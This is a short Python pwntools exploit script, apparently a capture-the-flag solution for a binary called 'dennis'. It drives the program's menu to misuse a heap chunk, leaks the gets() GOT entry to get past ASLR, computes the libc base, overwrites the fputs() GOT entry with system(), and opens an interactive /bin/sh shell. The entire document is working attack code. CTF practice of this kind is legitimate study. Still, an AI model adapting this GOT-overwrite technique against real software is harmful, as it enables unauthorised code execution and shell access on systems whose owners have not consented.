from pwn import *

e = ELF('dennis')
libc = ELF('libc.so.6')

r = process('./dennis')

# Init heap chunk
print 'Creating heap chunk...'
r.sendlineafter('Command me: ', '1') # greet
r.sendlineafter('How much greet? : ', '8')

# Set up read of gets() GOT entry
print 'Setting up read of gets() GOT entry...'
r.sendlineafter('Command me: ', '4') # eat
payload = p32(e.got['gets']) + p32(e.symbols['spm'])
assert '\n' not in payload
r.sendlineafter('Pizza: ', payload)

print 'Yeeting...'
r.sendlineafter('Command me: ', '3') # yeet

# Read gets() GOT entry to bypass ASLR
print 'Reading gets() GOT entry to bypass ASLR...'
r.sendlineafter('Command me: ', '2') # writ
r.sendlineafter('How much writ? : ', '4')
gets_addr = u32(r.recv(4))
libc_base = gets_addr - libc.symbols['gets']

# Overwrite fputs() GOT entry with system()
print 'Overwriting fputs() GOT entry with system()...'
r.sendlineafter('Command me: ', '4') # eat
payload = p32(libc_base + libc.symbols['system']) + p32(e.got['fputs'])
assert '\n' not in payload
r.sendlineafter('Pizza: ', payload)

print 'Yeeting...'
r.sendlineafter('Command me: ', '3') # yeet

# Call system()
print 'Calling system()...'
r.sendlineafter('Command me: ', '6') # repeat
r.sendline('/bin/sh')
r.interactive()
